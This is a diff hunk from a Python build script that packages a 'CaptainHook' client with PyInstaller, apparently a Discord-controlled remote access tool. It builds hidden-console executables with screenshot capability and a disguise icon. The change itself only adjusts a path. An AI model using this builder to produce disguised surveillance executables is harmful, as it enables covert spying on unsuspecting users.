@@ -288,13 +288,11 @@ def build(token, guild_id, preset_name, disguise_name):
             hidden_imports.append(f"--hidden-import=src.client.modules.{module}")
         
         hidden_imports_str = " ".join(hidden_imports)
-        staging_root = os.path.abspath("build_staging")
         
         noconsole = "--noconsole" if not preset.get("developer", False) else ""
         
-        # Build command with optimized options
-        # --collect-all often helps with missing data files in larger libraries
-        cmd = f"pyinstaller --onefile {noconsole} --name CaptainHook --paths={staging_root} {hidden_imports_str} --collect-all discord --collect-all mss build_staging/src/client/main.py"
+        # Build command with optimized options (Use relative path for --paths for Docker compatibility)
+        cmd = f"pyinstaller --onefile {noconsole} --name CaptainHook --paths=build_staging {hidden_imports_str} --collect-all discord --collect-all mss build_staging/src/client/main.py"
         
         if os.name == 'nt':
             cmd = cmd.replace("--name CaptainHook", f"--name CaptainHook --icon={disguise['icon']}")
